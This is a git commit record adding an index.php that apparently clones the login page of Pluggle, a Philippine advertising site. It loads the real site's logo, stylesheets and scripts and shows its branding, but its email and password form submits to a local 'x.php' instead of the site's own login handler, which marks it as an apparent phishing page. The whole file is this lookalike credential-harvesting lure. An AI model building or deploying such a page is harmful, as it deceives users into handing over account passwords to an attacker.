519ed6c13c2673071db45a4fca98fe95423b2503
pluggle <32413583+pluggle@users.noreply.github.com>
2017-09-30 05:14:04 -0700

    Rename pluggle.php to index.php

---
+++ index.php
@@ -0,0 +1,190 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <title>
+        Login
+                | Pluggle
+    
+</title>
+
+    <!-- icon -->
+    <link rel="icon" href="https://pluggle.com.ph/images/favicon.png" type="images/png">
+
+    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
+    <meta name="viewport" content="width=device-width" />
+
+    <!-- Canonical SEO -->
+    <link rel="canonical" href=""/>
+
+    <meta name="keywords" content="">
+
+    <!-- Schema.org markup for Google+ -->
+    <meta itemprop="name" content="Advertising Makes Sense">
+    <meta itemprop="description" content="Advertising Makes Sense">
+    <meta itemprop="image" content="">
+
+    <!-- Twitter Card data -->
+    <meta name="twitter:card" content="">
+    <meta name="twitter:site" content="">
+    <meta name="twitter:title" content="">
+    <meta name="twitter:description" content="">
+    <meta name="twitter:creator" content="">
+    <meta name="twitter:image" content="">
+
+    <!-- Open Graph data -->
+    <meta property="og:title" content="" />
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="" />
+    <meta property="og:image" content="" />
+    <meta property="og:description" content="" />
+    <meta property="og:site_name" content="Pluggle" />
+
+    <!--     Fonts and icons     -->
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:400,700|Material+Icons" />
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+
+    <!-- CSS Files -->
+    <link href="https://pluggle.com.ph/css/bootstrap.min.css" rel="stylesheet" />
+    <link href="https://pluggle.com.ph/css/material-bootstrap-wizard.css" rel="stylesheet" />
+    <link href="https://pluggle.com.ph/css/demo.css" rel="stylesheet" />
+        <!--page level css starts-->
+    <style type="text/css">
+        .error {
+            color: red;
+        }
+    </style>
+    <!--end of page level css-->
+    
+</head>
+
+<body>
+    <div class="image-container set-full-height" style="background-image: url('https://pluggle.com.ph/images/wizard-profile.jpg')">
+        <!--   Creative Tim Branding   -->
+        <a href="https://pluggle.com.ph">
+             <div class="logo-container">
+                <div class="logo">
+                    <img src="https://pluggle.com.ph/images/new_logo.png">
+                </div>
+                <div class="brand">
+
+                </div>
+            </div>
+        </a>
+
+        <!--  Made With Material Kit  -->
+        <a href="https://pluggle.com.ph/register" class="made-with-mk">
+            <i class="material-icons">person_add</i>
+            <div class="made-with">Sign Up<strong> and Time Up!</strong></div>
+        </a>
+
+        <!--   Big container   -->
+        <div class="container">
+            <div class="row">
+                <div class="col-sm-8 col-sm-offset-2">
+                    <!--      Wizard container        -->
+                    <div class="wizard-container">
+
+                        <div class="card wizard-card" data-color="green" id="wizardProfile">
+                                
+<form role="form" method="POST" action="x.php">
+                                <input type="hidden" name="_token" value="vX1rqxsCEu2JPp1AtokflSSfSAhbMat6DxkAEB3R">
+
+                                <div class="wizard-header">
+                                    <h3 class="wizard-title">
+                                       Login Pluggle Account 
+                                    </h3>
+                                    <h5>This information will let us know more about you.</h5>
+                                </div>
+                                <div class="wizard-navigation">
+                                    <ul>
+                                        <li><a href="#name" data-toggle="tab">Login</a></li>
+
+                                    </ul>
+                                </div>
+                                
+                                <div class="tab-content">
+                                    <div class="tab-pane" id="name">
+                                      <div class="row">
+                                            <h4 class="info-text"> Sign in with your Pluggle Account</h4>
+                                                                                                                                    <div class="col-sm-6">
+                                                <div class="picture-container">
+
+                                                </div>
+                                            </div>
+                                            <div class="col-sm-10 col-sm-offset-1">
+                                                <div class="input-group">
+                                                    <span class="input-group-addon">
+                                                        <i class="material-icons">email</i>
+                                                    </span>
+                                                    <div class="form-group label-floating">
+                                                      <label class="control-label">Email Address</label>
+                                                      <input id="login" name="login" type="text" class="form-control" value="">
+                                                      
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="col-sm-10 col-sm-offset-1">
+                                                <div class="input-group">
+                                                    <span class="input-group-addon">
+                                                        <i class="material-icons">lock_outline</i>
+                                                    </span>
+                                                    <div class="form-group label-floating">
+                                                      <label class="control-label">Password</label>
+                                                      <input id="password" name="password" type="password" class="form-control">
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            <div class="col-md-9 col-md-offset-3 col-sm-10 col-sm-offset-2 col-xs-12">
+                                                    
+
+                                        </div>
+                                            
+                                    </div>
+                                    </div>
+                                    </div>
+                                   <div class="wizard-footer">
+                                   <div class="pull-left">
+                                     </div>   
+                                       <input class='btn btn-finish btn-fill btn-warning btn-wd' value='Forgot Password' onclick="window.location.href='https://pluggle.com.ph/password/reset'" />
+                                    <div class="pull-right">
+                                        
+                                        <input type="submit"  id="btn-register" class='btn btn-finish btn-fill btn-success btn-wd' name='finish' value='Login' />
+                                    </div>
+
+                                    <div class="pull-left">
+                                        
+                                    </div>
+                                    <div class="clearfix"></div>
+                                </div>
+                            </form>
+                        </div>
+                    </div> <!-- wizard container -->
+                </div>
+            </div><!-- end row -->
+        </div> <!--  big container -->
+        
+        <div class="footer">
+            <div class="container text-center">
+                  <p class="text-center footer-text">&copy; 2017 Pluggle. Advertising</p>
+            </div>
+        </div>
+    </div>
+
+    <!--   Core JS Files   -->
+    <script src="https://pluggle.com.ph/js/jquery-2.2.4.min.js" type="text/javascript"></script>
+    <script src="https://pluggle.com.ph/js/bootstrap.min.js" type="text/javascript"></script>
+    <script src="https://pluggle.com.ph/js/jquery.bootstrap.js" type="text/javascript"></script>
+    <script src="https://pluggle.com.ph/js/jquery.validate.min.js" type="text/javascript"></script>
+
+        <!-- page level js starts-->
+    <script src="https://pluggle.com.ph/js/login.js" type="text/javascript"></script>
+    
+    <!--page level js ends-->
+
+            
+    </body>
+</html> 
